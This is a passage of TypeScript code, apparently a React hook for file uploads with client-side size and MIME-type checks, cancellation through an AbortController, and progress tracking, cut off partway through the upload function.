  allowedTypes?: string[];     // MIME types
}

interface UseFileUploadReturn<T> {
  status: UploadStatus;
  progress: number;            // 0–100
  error: string | null;
  data: T | null;
  upload: (file: File) => Promise<T | null>;
  cancel: () => void;
  reset: () => void;
}

export function useFileUpload<T = unknown>(
  options: UseFileUploadOptions
): UseFileUploadReturn<T> {
  const { url, fieldName = "file", maxSize, allowedTypes } = options;

  const [status, setStatus] = useState<UploadStatus>("idle");
  const [progress, setProgress] = useState(0);
  const [error, setError] = useState<string | null>(null);
  const [data, setData] = useState<T | null>(null);
  const controllerRef = useRef<AbortController | null>(null);

  const validate = useCallback(
    (file: File): string | null => {
      if (maxSize && file.size > maxSize) {
        return `File too large (max ${(maxSize / 1024 / 1024).toFixed(1)} MB)`;
      }
      if (allowedTypes && !allowedTypes.includes(file.type)) {
        return `Unsupported file type: ${file.type || "unknown"}`;
      }
      return null;
    },
    [maxSize, allowedTypes]
  );

  const upload = useCallback(
    async (file: File): Promise<T | null> => {
      setStatus("validating");
      setError(null);
      setData(null);
      setProgress(0);

      const validationError = validate(file);
      if (validationError) {
        setError(validationError);
        setStatus("error");
        return null;
      }

      const controller = new AbortController();
      controllerRef.current = controller;
      setStatus("uploading");

      const formData = new FormData();
      formData.append(fieldName, file);

      try {
        const response = await api.post<T>(url, formData, {
          signal: controller.signal,
          onUploadProgress: (e: AxiosProgressEvent) => {
            const total = e.total ?? 0;
            if (total <= 0) return;            // divide-by-zero guard
